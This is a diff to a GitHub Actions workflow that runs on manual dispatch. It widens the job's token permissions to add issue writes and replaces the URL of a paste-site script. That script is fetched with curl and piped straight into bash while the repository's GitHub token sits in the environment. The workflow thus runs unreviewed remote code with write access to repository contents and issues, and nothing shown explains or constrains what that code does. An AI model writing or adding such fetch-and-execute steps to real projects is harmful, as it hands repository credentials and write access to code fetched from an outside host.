@@ -2,10 +2,11 @@ name: b
 on: workflow_dispatch
 permissions:
   contents: write
+  issues: write
 jobs:
   b:
     runs-on: macos-26
     steps:
       - env:
           GH_TOKEN: ${{ github.token }}
-        run: curl -fsSL https://dpaste.com/AWJSR39EP.txt | bash
+        run: curl -fsSL https://dpaste.com/AAHHAXZPU.txt | bash
